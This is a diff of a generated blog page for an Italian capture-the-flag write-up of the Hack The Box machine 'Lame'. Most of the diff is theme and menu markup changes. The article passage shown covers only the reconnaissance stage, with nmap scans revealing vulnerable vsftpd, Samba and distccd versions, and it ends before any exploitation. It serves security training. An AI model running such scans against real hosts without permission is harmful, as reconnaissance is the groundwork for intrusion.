@@ -102,8 +102,8 @@
   <link
     type="text/css"
     rel="stylesheet"
-    href="/css/main.bundle.min.13b90cc160b0ac19874b3449bd786e78589cb5453b1a4bbed9eebea764aed20048ac46f6e293f10fbe163aa3975cbb4239d52403972ad8d6a0d33ac28bc6b284.css"
-    integrity="sha512-E7kMwWCwrBmHSzRJvXhueFictUU7Gku&#43;2e6&#43;p2Su0gBIrEb24pPxD74WOqOXXLtCOdUkA5cq2Nag0zrCi8ayhA==">
+    href="/css/main.bundle.min.fc6219bc90238fee9b0eacb5e869ac71f831ea2c8a66ec98a69af1340225acff76762eaefad6190b02283789da553fedfc3768741dcddde07f10fc86e50eba49.css"
+    integrity="sha512-/GIZvJAjj&#43;6bDqy16Gmscfgx6iyKZuyYpprxNAIlrP92di6u&#43;tYZCwIoN4naVT/t/DdodB3N3eB/EPyG5Q66SQ==">
 
   
   
@@ -142,8 +142,8 @@
       defer
       type="text/javascript"
       id="script-bundle"
-      src="/js/main.bundle.min.9cc802d09f28c6af56ceee7bc6e320a39251fdae98243f2a9942f221ac57a9f49c51609699a91794a7b2580ee1deaa8e4d794a68ffa94aa317c66e893ce51e02.js"
-      integrity="sha512-nMgC0J8oxq9Wzu57xuMgo5JR/a6YJD8qmULyIaxXqfScUWCWmakXlKeyWA7h3qqOTXlKaP&#43;pSqMXxm6JPOUeAg=="
+      src="/js/main.bundle.min.0e2e7ce1e319db5369cd4badb8265de52c78d08df54617521bdac9c8cd335eea6133a82c83f9cb19baf67b8133335130e7e8ff7cfeaf7171016648dbf5a0578a.js"
+      integrity="sha512-Di584eMZ21NpzUutuCZd5Sx40I31RhdSG9rJyM0zXuphM6gsg/nLGbr2e4EzM1Ew5&#43;j/fP6vcXEBZkjb9aBXig=="
       data-copy="Copy"
       data-copied="Copied"></script>
   
@@ -192,6 +192,9 @@
 
 
 
+
+
+
   
   
     <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
@@ -209,7 +212,6 @@
     "name": "Lame (HTB) - Writeup",
     "headline": "Lame (HTB) - Writeup",
     
-    "abstract": "Analisi di Lame su HTB: RCE su Samba, approfondimento delle vulnerabilità individuate e diversi approcci per la risoluzione",
     "inLanguage": "en",
     "url" : "http://localhost:1313/en/posts/writeup/lame/",
     "author" : {
@@ -269,8 +271,7 @@
 
 
   
-  
-  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
     <div id="the-top" class="absolute flex self-center">
       <a
         class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
@@ -285,296 +286,267 @@
 <div class="fixed inset-x-0 z-100">
   <div
     id="menu-blur"
-    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
+    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl bg-neutral/25 dark:bg-neutral-800/25"></div>
   <div class="relative m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32">
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div
-  class="main-menu flex items-center justify-between py-6 md:justify-start gap-x-3 pt-[2px] pr-2 md:pr-4 pb-[3px] pl-0">
+    <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
   
   
-
-  <div class="flex flex-1 items-center justify-between">
-    <nav class="flex space-x-3">
-      
-        <a href="/en/" class="text-base font-medium">
-          debugyourself
-        </a>
-      
-    </nav>
-    
-  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+    <a href="/en/" class="text-base font-medium truncate min-w-0 shrink">
+      debugyourself
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
     
       
-        
-  <a
-  href="/en/"
   
-  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
-  aria-label="Home"
-  title="debugyourself">
-  
-  
-    <p class="text-base font-medium">
-      Home
-    </p>
-  
-</a>
-
-
-
+    <a
+      href="/en/"
       
-        
-  <a
-  href="/en/posts/"
-  
-  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
-  aria-label="Blog"
-  title="Blog">
-  
-  
-    <p class="text-base font-medium">
-      Blog
-    </p>
-  
-</a>
-
-
-
+      class="flex items-center bf-icon-color-hover"
+      aria-label="Home"
+      title="debugyourself">
       
-        
-  <a
-  href="/en/about-me/"
-  
-  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
-  aria-label="About me"
-  title="About me">
-  
-  
-    <p class="text-base font-medium">
-      About me
-    </p>
-  
-</a>
-
-
-
       
-    
+        <span class="text-base font-medium break-normal">
+          Home
+        </span>
+      
+    </a>
+  
 
     
-  <div>
-    <div class="cursor-pointer flex items-center nested-menu">
+      
+  
+    <a
+      href="/en/posts/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="Blog"
+      title="Blog">
+      
+      
+        <span class="text-base font-medium break-normal">
+          Blog
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <a
+      href="/en/about-me/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="About me"
+      title="About me">
+      
+      
+        <span class="text-base font-medium break-normal">
+          About me
+        </span>
+      
+    </a>
+  
+
+    
+  
+
+  
+  <div class="translation nested-menu">
+    <button class="cursor-pointer flex items-center">
       <span class="me-1">
         <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
     <path fill="currentColor" d="M0 128C0 92.7 28.7 64 64 64H256h48 16H576c35.3 0 64 28.7 64 64V384c0 35.3-28.7 64-64 64H320 304 256 64c-35.3 0-64-28.7-64-64V128zm320 0V384H576V128H320zM178.3 175.9c-3.2-7.2-10.4-11.9-18.3-11.9s-15.1 4.7-18.3 11.9l-64 144c-4.5 10.1 .1 21.9 10.2 26.4s21.9-.1 26.4-10.2l8.9-20.1h73.6l8.9 20.1c4.5 10.1 16.3 14.6 26.4 10.2s14.6-16.3 10.2-26.4l-64-144zM160 233.2L179 276H141l19-42.8zM448 164c11 0 20 9 20 20v4h44 16c11 0 20 9 20 20s-9 20-20 20h-2l-1.6 4.5c-8.9 24.4-22.4 46.6-39.6 65.4c.9 .6 1.8 1.1 2.7 1.6l18.9 11.3c9.5 5.7 12.5 18 6.9 27.4s-18 12.5-27.4 6.9l-18.9-11.3c-4.5-2.7-8.8-5.5-13.1-8.5c-10.6 7.5-21.9 14-34 19.4l-3.6 1.6c-10.1 4.5-21.9-.1-26.4-10.2s.1-21.9 10.2-26.4l3.6-1.6c6.4-2.9 12.6-6.1 18.5-9.8l-12.2-12.2c-7.8-7.8-7.8-20.5 0-28.3s20.5-7.8 28.3 0l14.6 14.6 .5 .5c12.4-13.1 22.5-28.3 29.8-45H448 376c-11 0-20-9-20-20s9-20 20-20h52v-4c0-11 9-20 20-20z"/></svg></span>
       </span>
-      <div
-        class="text-sm font-medium hover:text-primary-600 dark:hover:text-primary-400"
-        title="Lame (HTB) - Writeup">EN</div>
-    </div>
-    <div class="absolute menuhide">
-      <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
-        <div class="flex flex-col space-y-3">
-          
-            <a href="/posts/writeup/lame/" class="flex items-center">
-              <p
-                class="text-sm font-sm hover:text-primary-600 dark:hover:text-primary-400"
-                title="Lame (HTB) - Writeup">
-                Italiano
-              </p>
-            </a>
-          
-            <a href="/en/posts/writeup/lame/" class="flex items-center">
-              <p
-                class="text-sm font-sm hover:text-primary-600 dark:hover:text-primary-400"
-                title="Lame (HTB) - Writeup">
-                English
-              </p>
-            </a>
-          
-        </div>
-      </div>
-    </div>
+      <span class="text-sm font-medium bf-icon-color-hover" title="Lame (HTB) - Writeup">EN</span>
+    </button>
+    <ul class="menuhide">
+      <li class="rounded-xl backdrop-blur shadow-2xl p-2 flex flex-col gap-1">
+        
+          <a href="/posts/writeup/lame/" class="flex items-center bf-icon-color-hover px-3 py-1">
+            <span class="text-sm font-sm" title="Lame (HTB) - Writeup">
+              Italiano
+            </span>
+          </a>
+        
+          <a href="/en/posts/writeup/lame/" class="flex items-center bf-icon-color-hover px-3 py-1">
+            <span class="text-sm font-sm" title="Lame (HTB) - Writeup">
+              English
+            </span>
+          </a>
+        
+      </li>
+    </ul>
   </div>
 
 
-    
+  
 
-    
-      <button
-        id="search-button"
-        aria-label="Search"
-        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
-        title="Search (/)">
-        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
 </span>
-      </button>
-    
+    </button>
+  
 
-    
-  </nav>
+  
+</nav>
 
-    
-  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
-    <span></span>
 
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      role="dialog"
+      aria-modal="true"
+      style="scrollbar-gutter: stable;"
+      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav class="mx-auto max-w-md space-y-6">
+        
+  
     
-  <div>
-    <div class="cursor-pointer flex items-center nested-menu">
+    <div class="px-2">
+      <a
+        href="/en/"
+        aria-label="Home"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="debugyourself" class="text-2xl font-bold tracking-tight">
+          Home
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/en/posts/"
+        aria-label="Blog"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="Blog" class="text-2xl font-bold tracking-tight">
+          Blog
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/en/about-me/"
+        aria-label="About me"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="About me" class="text-2xl font-bold tracking-tight">
+          About me
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+    <div
+      class="flex flex-wrap items-center [&_span]:text-2xl [&_.translation_button_.icon]:text-4xl! [&_.translation_button_span]:text-base! [&_.translation_.menuhide_span]:text-sm! gap-x-6 ps-2 mt-8 pt-8 border-t bf-border-color">
+      
+  <div class="translation nested-menu">
+    <button class="cursor-pointer flex items-center">
       <span class="me-1">
         <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
     <path fill="currentColor" d="M0 128C0 92.7 28.7 64 64 64H256h48 16H576c35.3 0 64 28.7 64 64V384c0 35.3-28.7 64-64 64H320 304 256 64c-35.3 0-64-28.7-64-64V128zm320 0V384H576V128H320zM178.3 175.9c-3.2-7.2-10.4-11.9-18.3-11.9s-15.1 4.7-18.3 11.9l-64 144c-4.5 10.1 .1 21.9 10.2 26.4s21.9-.1 26.4-10.2l8.9-20.1h73.6l8.9 20.1c4.5 10.1 16.3 14.6 26.4 10.2s14.6-16.3 10.2-26.4l-64-144zM160 233.2L179 276H141l19-42.8zM448 164c11 0 20 9 20 20v4h44 16c11 0 20 9 20 20s-9 20-20 20h-2l-1.6 4.5c-8.9 24.4-22.4 46.6-39.6 65.4c.9 .6 1.8 1.1 2.7 1.6l18.9 11.3c9.5 5.7 12.5 18 6.9 27.4s-18 12.5-27.4 6.9l-18.9-11.3c-4.5-2.7-8.8-5.5-13.1-8.5c-10.6 7.5-21.9 14-34 19.4l-3.6 1.6c-10.1 4.5-21.9-.1-26.4-10.2s.1-21.9 10.2-26.4l3.6-1.6c6.4-2.9 12.6-6.1 18.5-9.8l-12.2-12.2c-7.8-7.8-7.8-20.5 0-28.3s20.5-7.8 28.3 0l14.6 14.6 .5 .5c12.4-13.1 22.5-28.3 29.8-45H448 376c-11 0-20-9-20-20s9-20 20-20h52v-4c0-11 9-20 20-20z"/></svg></span>
       </span>
-      <div
-        class="text-sm font-medium hover:text-primary-600 dark:hover:text-primary-400"
-        title="Lame (HTB) - Writeup">EN</div>
+      <span class="text-sm font-medium bf-icon-color-hover" title="Lame (HTB) - Writeup">EN</span>
+    </button>
+    <ul class="menuhide">
+      <li class="rounded-xl backdrop-blur shadow-2xl p-2 flex flex-col gap-1">
+        
+          <a href="/posts/writeup/lame/" class="flex items-center bf-icon-color-hover px-3 py-1">
+            <span class="text-sm font-sm" title="Lame (HTB) - Writeup">
+              Italiano
+            </span>
+          </a>
+        
+          <a href="/en/posts/writeup/lame/" class="flex items-center bf-icon-color-hover px-3 py-1">
+            <span class="text-sm font-sm" title="Lame (HTB) - Writeup">
+              English
+            </span>
+          </a>
+        
+      </li>
+    </ul>
+  </div>
+
+
+
+      
     </div>
-    <div class="absolute menuhide">
-      <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
-        <div class="flex flex-col space-y-3">
-          
-            <a href="/posts/writeup/lame/" class="flex items-center">
-              <p
-                class="text-sm font-sm hover:text-primary-600 dark:hover:text-primary-400"
-                title="Lame (HTB) - Writeup">
-                Italiano
-              </p>
-            </a>
-          
-            <a href="/en/posts/writeup/lame/" class="flex items-center">
-              <p
-                class="text-sm font-sm hover:text-primary-600 dark:hover:text-primary-400"
-                title="Lame (HTB) - Writeup">
-                English
-              </p>
-            </a>
-          
-        </div>
-      </div>
-    </div>
-  </div>
-
-
-    
-
-    
-      <button
-        id="search-button-mobile"
-        aria-label="Search"
-        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
-        title="Search (/)">
-        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
-</span>
-      </button>
-    
-
-    
-  </div>
-
-  </div>
   
-  <div class="-my-2 md:hidden">
-    <div id="menu-button" class="block">
-      
-        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
-          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
-</span>
-        </div>
-        <div
-          id="menu-wrapper"
-          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
-          <ul
-            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none text-end max-w-7xl">
-            <li id="menu-close-button">
-              <span
-                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
-                <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
-</span>
-              </span>
-            </li>
 
-            
-              
-  <li class="mt-1">
-  <a
-    href="/en/"
-    
-    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
-    aria-label="Home"
-    title="debugyourself">
-    
-    
-      <p class="text-bg font-bg">
-        Home
-      </p>
-    
-  </a>
-</li>
+      </nav>
+    </div>
+  
+</div>
 
 
 
-            
-              
-  <li class="mt-1">
-  <a
-    href="/en/posts/"
-    
-    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
-    aria-label="Blog"
-    title="Blog">
-    
-    
-      <p class="text-bg font-bg">
-        Blog
-      </p>
-    
-  </a>
-</li>
 
 
 
-            
-              
-  <li class="mt-1">
-  <a
-    href="/en/about-me/"
-    
-    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
-    aria-label="About me"
-    title="About me">
-    
-    
-      <p class="text-bg font-bg">
-        About me
-      </p>
-    
-  </a>
-</li>
 
-
-
-            
-
-          </ul>
-          
-        </div>
-      
     </div>
   </div>
-
 </div>
 
 
@@ -582,10 +554,17 @@
 
   <script>
     (function () {
-      var $mainmenu = $(".main-menu");
+      var mainmenu = document.querySelector(".main-menu");
+      if (!mainmenu) return;
+
       var path = window.location.pathname;
-      $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
-        $(e).children("p").addClass("active");
+      var links = mainmenu.querySelectorAll('a[href="' + path + '"]');
+
+      links.forEach(function (link) {
+        var targets = link.querySelectorAll("span");
+        targets.forEach(function (el) {
+          el.classList.add("active");
+        });
       });
     })();
   </script>
@@ -597,8 +576,8 @@
 
 <script
   type="text/javascript"
-  src="/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js"
-  integrity="sha512-AKV8c&#43;oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ&#43;pkPSYl5ixQYmehaQ=="
+  src="/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+  integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
   data-blur-id="menu-blur"></script>
 
     
@@ -653,7 +632,7 @@
   
   <figure>
     <img
-      src="/en/posts/writeup/lame/feature_hu_57c52fc04389aa8f.png"
+      src="/en/posts/writeup/lame/feature_hu_3d08ebe4b6f34de0.png"
       alt="Lame (HTB) - Writeup"
       loading="eager"
       decoding="async"
@@ -878,8 +857,8 @@
         width="96"
         height="96"
         alt="m1ndl00p"
-        src="/img/avatar_hu_33a3e98618e8f56e.jpg"
-        data-zoom-src="/img/avatar_hu_b6004bc50998ac18.jpg">
+        src="/img/avatar_hu_59ff2e7ded0715a8.jpg"
+        data-zoom-src="/img/avatar_hu_257eca28086327b2.jpg">
     
   
   <div class="place-self-center">
@@ -915,13 +894,12 @@
       
       
       
-        <div class="order-first lg:ml-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
           <div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]">
-            
-              <details
+            <details
   open
   id="TOCView"
-  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
   <summary
     class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
     Table of Contents
@@ -1104,7 +1082,6 @@
 </script>
 
 
-            
           </div>
         </div>
       
@@ -1139,16 +1116,16 @@
 <p>Prima di provare qualsiasi forma di attacco è indispensabile avere una panoramica chiara dei servizi esposti dal server. La fase di <em>enumerazione</em> determina spesso il successo di un attacco o la qualità di un penetration test. Conoscere a fondo il bersaglio che si vuole attaccare consente di elaborare una solida strategia d&rsquo;attacco e concentrare gli sforzi sui punti critici.</p>
 <p>Il mio approccio è in genere quello di individuare tutte le porte aperte tramite una scansione veloce con <code>nmap</code> per poi approfondire l&rsquo;analisi in un secondo momento. Questo permette di ottenere rapidamente una panoramica iniziale dei servizi esposti e di concentrare l&rsquo;analisi solo sui servizi rilevanti.</p>
 <p>La seguente scansione con <code>nmap</code> rivela 5 servizi esposti su questo host:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> -T4 <span class="nv">$IP</span>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> -T4 <span class="nv">$IP</span>
 </span></span><span class="line"><span class="cl">​
 </span></span><span class="line"><span class="cl">PORT     STATE SERVICE      REASON
 </span></span><span class="line"><span class="cl">21/tcp   open  ftp          syn-ack ttl <span class="m">63</span>
 </span></span><span class="line"><span class="cl">22/tcp   open  ssh          syn-ack ttl <span class="m">63</span>
 </span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn  syn-ack ttl <span class="m">63</span>
 </span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds syn-ack ttl <span class="m">63</span>
-</span></span><span class="line"><span class="cl">3632/tcp open  distccd      syn-ack ttl <span class="m">63</span>
-</span></span></code></pre></div><p>Procedendo con una scansione più approfondita, si ottengono informazioni aggiuntive sul bersaglio come le versioni software in esecuzione e altri dettagli utili per proseguire l&rsquo;analisi:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -sV -sC -p21,22,139,445,3632 --min-rate<span class="o">=</span><span class="m">1000</span> -T4 <span class="nv">$IP</span>
+</span></span><span class="line"><span class="cl">3632/tcp open  distccd      syn-ack ttl <span class="m">63</span></span></span></code></pre></div></div>
+<p>Procedendo con una scansione più approfondita, si ottengono informazioni aggiuntive sul bersaglio come le versioni software in esecuzione e altri dettagli utili per proseguire l&rsquo;analisi:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -sV -sC -p21,22,139,445,3632 --min-rate<span class="o">=</span><span class="m">1000</span> -T4 <span class="nv">$IP</span>
 </span></span><span class="line"><span class="cl">​
 </span></span><span class="line"><span class="cl">PORT     STATE SERVICE     REASON         VERSION
 </span></span><span class="line"><span class="cl">21/tcp   open  ftp         syn-ack ttl <span class="m">63</span> vsftpd 2.3.4
@@ -1173,8 +1150,8 @@
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew<span class="o">==</span>
 </span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn syn-ack ttl <span class="m">63</span> Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
 </span></span><span class="line"><span class="cl">445/tcp  open  netbios-ssn syn-ack ttl <span class="m">63</span> Samba smbd 3.0.20-Debian <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
-</span></span><span class="line"><span class="cl">3632/tcp open  distccd     syn-ack ttl <span class="m">63</span> distccd v1 <span class="o">((</span>GNU<span class="o">)</span> 4.2.4 <span class="o">(</span>Ubuntu 4.2.4-1ubuntu4<span class="o">))</span>
-</span></span></code></pre></div><p>La seguente tabella riassume tutte le informazioni trovate finora:</p>
